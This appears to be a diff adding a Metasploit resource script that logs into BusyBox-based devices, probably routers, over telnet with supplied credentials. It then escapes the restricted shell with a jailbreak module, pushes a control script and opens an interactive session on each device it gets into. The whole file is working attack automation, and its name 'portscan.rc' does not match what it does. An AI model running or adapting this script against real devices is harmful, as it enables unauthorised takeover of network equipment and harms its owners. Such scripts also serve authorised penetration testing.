@@ -1,0 +1,59 @@
+# portscan.rc
+# Author: Javier Vicente Vallejo (Web: http://vallejo.cc / Twitter: @vallejocc)
+
+# This Metasploit RC-File could be used to login into a device (probably a router)
+# via telnet with a given username and password. It will try to jailbreak the
+# default shell and it will try to send a script to control the device easily.
+# It is though to work with busybox based deviced.
+# RHOSTS is used from the global datastore
+# USERNAME is used from the global datastore
+# PASSWORD is used from the global datastore
+
+<ruby>
+
+if (framework.datastore['RHOSTS'] == nil)
+	print_status("you have to set RHOSTS globally ... exiting")
+	return
+end
+
+if (framework.datastore['USERNAME'] == nil)
+	print_status("you have to set USERNAME globally ... exiting")
+	return
+end
+
+if (framework.datastore['PASSWORD'] == nil)
+	print_status("you have to set PASSWORD globally ... exiting")
+	return
+end
+
+
+print_line("")
+print_line("starting ...")
+print_line("")
+
+run_single("use auxiliary/scanner/telnet/telnet_login")
+run_single("set RHOSTS #{framework.datastore['RHOSTS']}")
+run_single("set PASSWORD #{framework.datastore['PASSWORD']}")
+run_single("set USERNAME #{framework.datastore['USERNAME']}")
+run_single("run")
+
+sleep 1
+
+framework.sessions.each_key do |session|
+	print_status("Running against session #{session}")
+	sleep 1
+	run_single("use post/linux/manage/busybox_jailbreak")
+	run_single("set SESSION #{session}")
+	run_single("run")
+	sleep 1
+	run_single("use post/linux/manage/busybox_control")
+	run_single("set SESSION #{session}")
+	run_single("run")
+	sleep 1
+	run_single("sessions -i #{session}")
+end
+
+</ruby>
+
+
+
